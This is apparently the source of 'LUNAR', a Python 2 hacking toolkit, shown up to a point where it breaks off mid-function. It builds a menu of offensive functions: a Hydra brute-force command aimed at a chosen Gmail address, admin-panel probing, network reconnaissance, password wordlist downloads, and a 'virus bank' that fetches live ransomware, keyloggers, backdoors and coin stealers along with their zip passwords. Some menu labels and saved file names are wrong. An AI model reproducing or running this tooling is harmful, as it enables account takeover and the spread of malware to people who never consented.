#!/usr/bin/env python
# -*- coding:  latin_1 -*-

# Written by Metachar
# https://wwww.github.com/MetaChar/LUNAR

# https://github.com/danielmiessler/SecLists


# FRAMEWRORK
# Python 2.7
# VERSION 0.1.0
# Linux Windows & Andriod



# imports
import re 
import os
import sys
import json
import socket
import random
import requests
import urllib2
import hashlib
import datetime
import time as t
import subprocess
from bs4 import BeautifulSoup
from colorama import init, Fore
from cryptography.fernet import Fernet
from urllib2 import Request, urlopen, URLError, HTTPError


#Graphics
class color:
	PURPLE = '\033[95m'
	CYAN = '\033[96ms'
	DARKCYAN = '\033[36m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m' 
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'
	CWHITE = '\33[37m'
#Stolen from pastejacker lol 
logo1 = color.BLUE + '''
      :::       :::    ::: ::::    :::     :::     :::::::::    
     :+:       :+:    :+: :+:+:   :+:   :+: :+:   :+:    :+:    
    +:+       +:+    +:+ :+:+:+  +:+  +:+   +:+  +:+    +:+     
   +#+       +#+    +:+ +#+ +:+ +#+ +#++:++#++: +#++:++#:       
  +#+       +#+    +#+ +#+  +#+#+# +#+     +#+ +#+    +#+       
 #+#       #+#    #+# #+#   #+#+# #+#     #+# #+#    #+#        
########## ########  ###    #### ###     ### ###    ###     
 {2}/─────────────────────────────────────────────────────\\
 {2}[{3}=>{2}]     {0}Python Hacking Framework and toolkit      {2}[{3}<={2}]
 {2}[{3}=>{2}]             {1}Coded By Metchar                  {2}[{3}<={2}]
 {2}[{3}=>{2}]              {1}Version: 1.0.0                   {2}[{3}<={2}]
 {2}[{3}=>{2}]            {1}Instagram @Zucccss                 {2}[{3}<={2}]
 {2}[{3}=>{2}]         {1}Networking web tools & more           {2}[{3}<={2}]
 {2}[{3}=>{2}]                                               {2}[{3}<={2}]
 {2}[{3}=>{2}]           {0}TYPE {3}"HELP" {0}FOR OPTIONS             {2}[{3}<={2}] 
 {2}\_____________________________________________________/\n\n'''.format(color.CWHITE, color.BLUE,color.GREEN, color.YELLOW).decode('utf')


# Vars
x = os.path.dirname(os.path.realpath(__file__))
history = []
logo_list = [logo1]
version = 1
termsAndConditions = color.BLUE + ''' Don`t Use LUNAR To:
create and share malicious viruses, illegally harm others computers,
interrupt wifi / bluetooth signals without permission, violate security,
and violate privacy

'''

help_mesg = '''
{0}[+] {1}Default commands {2}(7)
{0} └──> {1}clear/cls   : Clears Screen (linux)/ Windows 
{0} └──> {1}exit        : Exits
{0} └──> {1}help        : Shows help screen
{0} └──> {1}/           : Use last command
{0} └──> {1}banner      : prints banner
{0} └──> {1}History     : Shows command History
{0} └──> {1}Tools       : Shows all downloadable tools
{0} └──> {1}c-history   : Clears command history
{0} └──> {1}os          : Enter a os command
{0} └──> {1}msf         : Starts Metasploit

{0}[+] {1}Cryptography {2}(7)
{0} └──> {1}hex_encode  : Encode word(s) to hex
{0} └──> {1}hex_decode  : Decode Hex to string
{0} └──> {1}key_encode  : Encodes word(s) to a token & key
{0} └──> {1}key_decode  : Decodes a token & key to words
{0} └──> {1}hash_md5    : Encodes word(s) to hash (MD5)
{0} └──> {1}hash_sha256 : Encodes word(s) to hash (SHA256)
{0} └──> {1}hash_sha512 : Encodes word(s) to hash (SHA256)
{0} └──> {1}hash_sha1   : Encodes word(s) to hash (SHA1)
{0} └──> {1}hash_sha384 : Encodes word(s) to hash (SHA384)

{0}[+] {1}Virus Bank Mac {2} (10) --> Pass infect3d <--
{0} └──> {1} mac_backdoor: Downloads a mac backdoor virus
{0} └──> {1} mac_keylog  : Downloads a mac key logger
{0} └──> {1} mac_adware  : Downloads a mac adware virus
{0} └──> {1} mac_thief   : Downloads a mac bitcoin stealing virus 
{0} └──> {1} mac_dropper : Downloads a mac dropper virus
{0} └──> {1} mac_spyware : Downloads a mac spyware virus
{0} └──> {1} mac_ransom  : Downloads a mac ransomware virus
{0} └──> {1} mac_worm    : Downloads a mac worm
{0} └──> {1} mac_pass    : Downloads a mac password stealer

{0}[+] {1}Virus Bank Windows {2} (6) --> Pass Infected <--
{0} └──> {1} win_fflash  : Downloads a fake flash player malware
{0} └──> {1} win_bonzi   : Downloads Bonzi Buddy
{0} └──> {1} win_memz    : Downloads the MEMZ virus
{0} └──> {1} win_phish   : Downloads a email phisher
{0} └──> {1} win_exploit : Downloads a exploit kit
{0} └──> {1} win_trojan  : Downloads a Trojan

{0}[+] {1}Wordlist {2} (6)
{0} └──> {1} realpass12k : Downloads a real password list with 12k words
{0} └──> {1} darkweb2017 : Download the top passwords from the dark web
{0} └──> {1} prob_wpa    : Download probable WPA passwords
{0} └──> {1} unknown-azul: Downloads txt list unknown azul
{0} └──> {1} bt4_list    : Downloads the bt4 pass list
{0} └──> {1} cracked_hash: Downloads the cracked hash list

{0}[+] {1}Networking {2} (12)
{0} └──> {1} showmac     : Shows mac address
{0} └──> {1} showip      : Show ipaddress
{0} └──> {1} port listen : Listen to a port
{0} └──> {1} geolocation : Locate an ip address
{0} └──> {1} reverse_ip  : Reverse ip domian lookup
{0} └──> {1} dns_lookup  : Do a dns lookup
{0} └──> {1} dns_host_rec: Show a dns servers host record
{0} └──> {1} zonetransfer: Do a zone transfer test
{0} └──> {1} shared_dns  : Show a dns servers shared dns
{0} └──> {1} traceroute  : Trace an ip
{0} └──> {1} Whois       : Does a Whois lookup
{0} └──> {1} tcpscan     : Does a tcp port scan
{0} └──> {1} wireshark   : Opens wireshark with choice of iface

{0}[+] {1}Web{2} (5)
{0} └──> {1} sourcecode  : Get source code from website
{0} └──> {1} site2ip     : Find ip address from website
{0} └──> {1} headers     : Show headers of a website
{0} └──> {1} admin       : Find admin pannel of website
{0} └──> {1} hydra       : Hydra email brute force
{0} └──> {1} sublink     : Find links from a website

'''.format(color.BLUE, color.CWHITE, color.GREEN, color.YELLOW).decode('utf')

tools ='''
{0}[+] {1}Download tools {2}(31)
{0} └──> {1}eagle-eye   : Downloads Eagle Eye    
{0} └──> {1}highjack    : Downloads HighJacker   
{0} └──> {1}mercury     : Downloads Mercury      
{0} └──> {1}devploit    : Downloads devploit    
{0} └──> {1}pureblood   : Downlaods Pure Blood  
{0} └──> {1}inspector   : Downloads Th3Inspector 
{0} └──> {1}badmod      : Downloads BadMod      
{0} └──> {1}Photon      : Downloads Photon       
{0} └──> {1}pyhawk      : Downloads Pyhawk       
{0} └──> {1}msf-down    : Downloads Metasploit  
{0} └──> {1}hammer      : Downloads Hammer       
{0} └──> {1}xerxes      : Downloads xerxes       
{0} └──> {1}aircrack    : Downloads Aircrack     
{0} └──> {1}sql-down    : Downloads Sqlmap       
{0} └──> {1}l-download  : Downloads LazyScript   
{0} └──> {1}f-society   : Downloads Fsociety     
{0} └──> {1}xss-strike  : Downloads XSS strike   
{0} └──> {1}wp-scan     : Downloads Wp-scan      
{0} └──> {1}cupp        : Downloads Cupp         
{0} └──> {1}hydra-d     : Downloads Hydra        
{0} └──> {1}wifite      : Downloads Wifite       
{0} └──> {1}instabrute  : Downloads Instabrute  
{0} └──> {1}reaver      : Downloads Reaver       
{0} └──> {1}nmap-down   : Downloads Nmap         
{0} └──> {1}admin-pan   : Downloads Admin Pannel 
{0} └──> {1}credmap     : Downloads Credmap      
{0} └──> {1}hacktronian : Downloads hacktronian  
{0} └──> {1}gasmask     : Downloads Gas Mask     
{0} └──> {1}dedsploit   : Downloads DedSploit    
{0} └──> {1}cookie-s    : Downloads CookieStealer    
{0} └──> {1}killchain   : Downloads Kill chain 

'''.format(color.BLUE, color.CWHITE, color.GREEN).decode('utf')
# Small Funcs

def clear():
	os.system('cls')
	os.system('clear')

def ErrorLog(text):
    print (color.RED + "[-] "+color.CWHITE + text)

def  WarningLog(text):
    print (color.RED + "[!] "+color.CWHITE + text)

def SuccessLog(text):
    print (color.GREEN + "[+] "+color.CWHITE + text)

def agreement():
 clear()
 afile = open(x+'/Extra/LUNAR.txt','r+')
 term = afile.readlines() 
 for line in term: 
     if 'yes' in line:
         print (logo1)
         main()
     if ' ' in line: #if not load up terms
         print(termsAndConditions)
         agree = raw_input(color.YELLOW + 'Type [yes] To Agree: ')
         if agree.lower() == 'yes': #saves agree
             file = open(x+'/Extra/LUNAR.txt','w')
             afile.write('yes')
             file.close()
             afile.close()
             logo_pick = random.choice(logo_list)
             print logo_pick
             main()
         else:
        	agreement()

def platform_check():
    plat_file = open(x+'/Extra/sys.txt','r+')
    term_plat = plat_file.readlines()
    for line in term_plat:
        if 'windows' in line:
            init(convert=True)
            agreement()
        if 'linux' in line:
            init(convert=False)
            agreement()
        if ' ' in line:
            print ('What OS are you using (linux) or (windows)')
            os = raw_input()
            plat_file.write(os)
            agreement()
        platform_check()
        
# Modules #

def sublink():
    page = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a website: ')
    html_page = urllib2.urlopen(page)
    soup = BeautifulSoup(html_page, "lxml")
    print '\n'
    for link in soup.findAll('a'):
        print (color.GREEN + '--> '+color.CWHITE+ str(link.get('href')).decode('utf'))

def wireshark():
    try:
        iface = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a iface: ')
        sys = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Are you '+color.BLUE+'W'+color.CWHITE+'/'+color.GREEN+'L ')
        if sys.lower() == 'l':
            command = 'sudo wireshark -i '+ iface
            os.system(command)
        else:
            command = 'wireshark -i '+ iface
            os.system(command)

    except KeyboardInterrupt:
        main()



def hydra_brute():
    try:
        victum = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a email to brute force: ')
        wordlist = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a wordlist file ')
        os.system(str('hydra smtp.gmail.com smtp -l {0} -P {1} -s 465 -S -v -V').format(victum, wordlist))
    except KeyboardInterrupt:
        main()


def admin():
    links = open(x+'\Resources\links.txt')
    website = raw_input(color.GREEN +'[+]'+color.CWHITE + ' Enter a site to scan ex www.google.com: ')
    type_link = raw_input(color.GREEN + ' └──> '.decode('utf')+color.GREEN +'[+]'+color.CWHITE +' Is the link https or http: ')
    count = 1
    while True:
        try:
            sub_link = links.readline(count)
            website2 = type_link+'://'+website+'/'+ sub_link
            req = Request(website2)
            response = urlopen(req)
        except HTTPError as e:
            print color.GREEN + ' └──> '.decode('utf') +color.CWHITE + '[RESPONSE][FAIL] ==> '+ website2
            count += 1 
        except URLError as e:
            print color.GREEN + ' └──> '.decode('utf') +color.CWHITE + '[RESPONSE][FAIL] ==> '+ website2
            count += 1
        except  KeyboardInterrupt:
            main()
            links.close()
        else:
            print color.GREEN + ' └──> '.decode('utf') + '[RESPONSE][SUCCESS] ==> '+ website2
            yn = raw_input(color.GREEN +'[+]'+color.CWHITE + 'would you like to continue? {0}y{1}/{2}n{1} '.format(color.GREEN, color.CWHITE, color.RED))
            if yn.lower() == 'y':
                pass
            if yn.lower() == 'n':
                main()
def whois_lookup():
    site =raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a ip: ')
    site_api = 'https://api.hackertarget.com/whois/?q='
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def headers():
    site =raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a site ex: google.com : ')
    site_api = 'https://api.hackertarget.com/httpheaders/?q='+site
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def dns_lookup():
    site =raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a site ex: google.com : ')
    site_api = 'https://api.hackertarget.com/dnslookup/?q='+site
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def dns_host_records():
    site =raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a site ex: google.com : ')
    site_api = 'https://api.hackertarget.com/hostsearch/?q='+site
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def zonetransfer():
    site =raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a site ex: google.com : ')
    site_api = 'https://api.hackertarget.com/zonetransfer/?q='+site
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def findshareddns_servs():
    dns=raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a dns server: ')
    site_api = 'https://hackertarget.com/find-shared-dns-servers/'+dns
    api_url = urllib2.urlopen(site_api).read()
    print api_url

def tcpscan():
    try:
        ip = raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a ip: ')
        site_api = 'https://api.hackertarget.com/nmap/?q='+ip
        api_url = urllib2.urlopen(site_api).read()
        print api_url
    except KeyboardInterrupt:
        main()

def trace():
    try:
        ip = raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a ip: ')
        site_api = 'https://api.hackertarget.com/mtr/?q='+ip
        api_url = urllib2.urlopen(site_api).read()
        print api_url
    except KeyboardInterrupt:
        main()

def rev_ip():
    dom =  raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a domain: ')
    api_url  = urllib2.urlopen('http://api.hackertarget.com/reverseiplookup/?q='+dom).read()
    print (color.CWHITE+ api_url).decode('utf')

def geolocation():
    try:
        ip =  raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter an ip: ')
        url = "http://ip-api.com/json/"
        reponse = urllib2.urlopen(url + ip)
        name = reponse.read()
        jsonip = json.loads(name)
        print (color.GREEN + ' └──> IP: '.decode('utf') + color.CWHITE + jsonip['query'])
        print (color.GREEN + ' └──> STATUS: '.decode('utf') + color.CWHITE + jsonip['status'])
        print (color.GREEN + ' └──> REGION: '.decode('utf') + color.CWHITE + jsonip['regionName'])
        print (color.GREEN + ' └──> COUNTRY: '.decode('utf') + color.CWHITE + jsonip['country'])
        print (color.GREEN + ' └──> CITY: '.decode('utf') + color.CWHITE + jsonip['city'])
        print (color.GREEN + ' └──> ISP: '.decode('utf') + color.CWHITE + jsonip['isp'])
        print (color.GREEN + ' └──> LAT & LONG: '.decode('utf') + color.CWHITE +str(jsonip['lat']) + "," + str(jsonip['lon']))
        print (color.GREEN + ' └──> ZIPCODE: '.decode('utf') + color.CWHITE +jsonip['zip'])
        print (color.GREEN + ' └──> TIMEZONE: '.decode('utf') + color.CWHITE + jsonip['timezone'])
        main()
    except urllib2.HTTPError:
        ErrorLog('Invailed IP')
        main()
    except KeyError:
        pass
    except KeyboardInterrupt:
        main()

def sourcecode():
    try:
        url = raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a url: ')
        html1 = open('sourecode.html', 'a+')
        response = urllib2.urlopen(url) 
        page_source = response.read() 
        html1.write(page_source)
        print color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Saved as sourcecode.html'
        main()
    except KeyboardInterrupt:
        main()
    except ValueError:
        ErrorLog('Invalid Url')

def listen():
	ip = socket.gethostbyname(socket.gethostname())
	print (color.RED + 'Once started it cant be stopped without fully closing the program! ')
	port = raw_input(color.BLUE + 'Enter a port: ')
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	port = int(port)
	try:
		s.bind((ip,port))
		s.listen(1)
		while True:
  		 	print color.GREEN + ' └──> '.decode('utf') + color.CWHITE + s.accept()[1] 		 	
	except KeyboardInterrupt:
		s.close()
        main()

def site2ip():
    try:
        url = raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a url: ')
        ip_url = socket.gethostbyname(url)
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + ip_url)
    except socket.gaierror:
        ErrorLog('Use a valid link exclude http/https')

def passlistREAL():
    SuccessLog('Downloading')
    response = urllib2.urlopen('https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt')
    page_source = response.read()
    filepass = open('12krealpass.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ '12krealpass.txt')
    filepass.close()

def wpapassreal():
    SuccessLog('Downloading')
    response = urllib2.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt')
    page_source = response.read()
    filepass = open('probable-v2-wpa-top447.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ 'probable-v2-wpa-top447.txt')
    filepass.close()

def crackedhashes():
    SuccessLog('Downloading')
    response = urllib2.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt')
    page_source = response.read()
    filepass = open('milw0rm-dictionary.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ 'milw0rm-dictionary.txt')
    filepass.close()


def DarkWebpass():
    SuccessLog('Downloading')
    response = urllib2.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt')
    page_source = response.read()
    filepass = open('darkweb2017-top10000.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ 'darkweb2017-top10000.txt')
    filepass.close()

def unknownAzul():
    SuccessLog('Downloading')
    response = urllib2.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/unkown-azul.txt')
    page_source = response.read()
    filepass = open('unkown-azul.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ 'unkown-azul.txt')
    filepass.close()

def bt4password():
    SuccessLog('Downloading 14.9 mb')
    response = urllib2.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/bt4-password.txt')
    page_source = response.read()
    filepass = open('bt4-password.txt','a+')
    filepass.write(page_source)
    print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Done saved as '+color.GREEN+ 'bt4-password.txt')
    filepass.close()

def KeyDECODE():
    try:
        token =  raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a  token: ')
        key = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a key: ')
        f = Fernet(key)
        print f.decrypt(token)

    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')

def win_fflash():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://www.malware-traffic-analysis.net/2014/05/17/2014-05-17-fake-Flash-updater-malware.zip'
        resp = urllib2.urlopen(url)
        with open('2014-05-17-fake-Flash-updater-malware.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (Fake Flash Updater)      
{1}└──>{0} Virus Name: {3} (flash updater)
{1}└──>{0} Virus Info: {3} https://www.malware-traffic-analysis.net/2014/05/17/index.html
{1}└──>{0} Virus Total: {3} ???   
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def win_bonzi():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'http://bonzi.link/Bon.zip'
        resp = urllib2.urlopen(url)
        with open('Bon.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (spyware)      
{1}└──>{0} Virus Name: {3} (Bonzi Buddy)
{1}└──>{0} Virus Info: {3} http://malware.wikia.com/wiki/BonziBUDDY
{1}└──>{0} Virus Total: {3} https://www.virustotal.com/en/file/f1e859d99072e35f20e172d8458e3ea1baf8ba86c8c9e311a0debcd2acd5d0fc/analysis/1432901157/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def win_memz():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://github.com/Horter/MEMZ-4.0/archive/master.zip'
        resp = urllib2.urlopen(url)
        with open('MEMZ-4.0-master','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (trojan)      
{1}└──>{0} Virus Name: {3} (MEMZ Virus)
{1}└──>{0} Virus Info: {3} http://malware.wikia.com/wiki/MEMZ
{1}└──>{0} Virus Total: {3} ???
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def win_phishing():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://www.malware-traffic-analysis.net/2014/11/12/2014-11-12-Asprox-malware-and-artifacts.zip'
        resp = urllib2.urlopen(url)
        with open('2014-11-12-Asprox-malware-and-artifacts.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (trojan)      
{1}└──>{0} Virus Name: {3} (MEMZ Virus)
{1}└──>{0} Virus Info: {3} https://www.malware-traffic-analysis.net/2014/11/12/index.html
{1}└──>{0} Virus Total: {3} https://www.virustotal.com/en/file/e6dc1655d31aec69533d9c8bec205615a164b66eed48176cd63140707a3a5cde/analysis/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def win_exploitkit():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://www.malware-traffic-analysis.net/2014/08/22/2014-08-22-unknown-EK-malware.zip'
        resp = urllib2.urlopen(url)
        with open('2014-08-22-unknown-EK-malware.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (Exploit Kit)      
{1}└──>{0} Virus Name: {3} (Unknown Exploit Kit)
{1}└──>{0} Virus Info: {3} https://www.malware-traffic-analysis.net/2014/11/12/index.html
{1}└──>{0} Virus Total: {3} https://www.virustotal.com/en/file/f31c557625286af01fc5dc3afa5b1cb43420cf5737d0c63a49faefb91cb387be/analysis/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def win_trojan():
    try:
        print (color.GREEN + '[+] '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://www.malware-traffic-analysis.net/2014/01/13/2014-01-13-malware-from-Goon-EK-traffic.zip'
        resp = urllib2.urlopen(url)
        with open('2014-01-13-malware-from-Goon-EK-traffic.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (Trojan Downloader)      
{1}└──>{0} Virus Name: {3} (Goon-EK)
{1}└──>{0} Virus Info: {3} https://www.malware-traffic-analysis.net/2014/01/13/index.html
{1}└──>{0} Virus Total: {3} https://www.virustotal.com/en/file/e65fd0090bd04fb2f239acd1d443879f06c440e745fb0539e4ab53e64e9e2f23/analysis/1389588377/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_backdoor():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/Adwind.zip'
        resp = urllib2.urlopen(url)
        with open('Adwind.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (backdoor)      
{1}└──>{0} Virus Name: {3} (AdWind)
{1}└──>{0} Virus Info: {3} https://blog.malwarebytes.com/threat-analysis/2016/07/cross-platform-malware-adwind-infects-mac/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/7aa15bd505a240a8bf62735a5389a530322945eec6ce9d7b6ad299ca33b2b1b0/    
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_keylog():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/AoboKeylogger%20(Baoba).zip'
        resp = urllib2.urlopen(url)
        with open('AoboKeylogger (Baoba).zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (keylogger)      
{1}└──>{0} Virus Name: {3} (AoboKeylogger (Baoba))
{1}└──>{0} Virus Info: {3} https://www.symantec.com/security-center/writeup/2009-102722-1157-99
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/06bf4694bb53c4fc09f1304b28798d28eb06ef0bcc79cbec6098b7dd69288506/    
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_adware():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/ClickAgent.zip'
        resp = urllib2.urlopen(url)
        with open('ClickAgent.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (adware)      
{1}└──>{0} Virus Name: {3} (ClickAgent)
{1}└──>{0} Virus Info: {3}https://blog.malwarebytes.com/threat-analysis/2013/08/fake-flash-player-update-causes-mayhem-in-your-browser/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/12af7ae4815e095fd1f6852df07eccaec870c062ffcdf4c0edbe17312da2c37c/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_thief():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/CoinThief.zip'
        resp = urllib2.urlopen(url)
        with open('CoinThief.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (bitcointhief)      
{1}└──>{0} Virus Name: {3} (CoinThief)
{1}└──>{0} Virus Info: {3} http://www.thesafemac.com/new-cointhief-malware-discovered/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/7f32fdcaefee42f93590f9490ab735ac9dfeb22a951ff06d721145baf563d53b/    
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_dropper():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/EvilEgg.zip'
        resp = urllib2.urlopen(url)
        with open('EvilEgg.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (Dropper)      
{1}└──>{0} Virus Name: {3} (Evil Egg)
{1}└──>{0} Virus Info: {3} https://blog.malwarebytes.com/threat-analysis/2018/10/mac-cryptocurrency-ticker-app-installs-backdoors/
{1}└──>{0} Virus Total:{3} https://www.virustotal.com/#/file/f4f45e16dd276b948dedd8a5f8d55c9e1e60884b9fe00143cb092eed693cddc4/   
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_spyware():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/DevilRobber.zip'
        resp = urllib2.urlopen(url)
        with open('DevilRobber.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (spyware)      
{1}└──>{0} Virus Name: {3} (DevilRobber)
{1}└──>{0} Virus Info: {3} https://www.intego.com/mac-security-blog/new-malware-devilrobber-grabs-files-and-bitcoins-performs-bitcoin-mining-and-more/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/868926dc8773abddb806327b3ca9928e9d76a32abd273ea16ed73f4286260724/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_ransom():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/FileCoder.zip'
        resp = urllib2.urlopen(url)
        with open('Adwind.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (ransomware)      
{1}└──>{0} Virus Name: {3} (FileCoder)
{1}└──>{0} Virus Info: {3} https://securelist.com/unfinished-ransomware-for-macos-x/66760/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/c9c7c7f1afa1d0760f63d895b8c9d5ab49821b2e4fe596b0c5ae94c308009e89/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_worm():
    try:
